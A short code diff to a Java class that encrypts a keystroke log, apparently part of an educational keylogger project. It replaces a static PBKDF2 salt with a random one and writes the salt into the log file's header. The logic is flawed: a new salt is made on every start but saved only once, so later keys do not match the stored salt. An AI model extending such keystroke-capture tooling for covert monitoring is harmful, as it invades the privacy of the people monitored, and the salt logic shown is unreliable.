@@ -20,9 +20,27 @@ public class EncryptedLogger {
     private static final File LOG_FILE = new File("logs/keystrokes.enc");
 
     public EncryptedLogger(char[] password) throws Exception {
-        // Derive key using PBKDF2 with a static (for now) salt
-        byte[] salt = "educationalSalt!".getBytes(); // still static — we'll improve next
+        
+        byte[] salt = generateRandomSalt();
         this.key = deriveKey(password, salt);
+
+        LOG_FILE.getParentFile().mkdirs();
+
+        if (!LOG_FILE.exists()) {
+            try(BufferedWriter writer = new BufferedWriter(new FileWriter(LOG_FILE))) {
+                
+            String encodedSalt = Base64.getEncoder().encodeToString(salt);
+            writer.write("SALT::" + encodedSalt);
+            writer.newLine(); 
+            }
+        }
+    }
+
+    private byte[] generateRandomSalt() {
+        byte[] salt = new byte[16];
+
+        new SecureRandom().nextBytes(salt);
+        return salt;
     }
 
     private SecretKeySpec deriveKey(char[] password, byte[] salt) throws Exception {
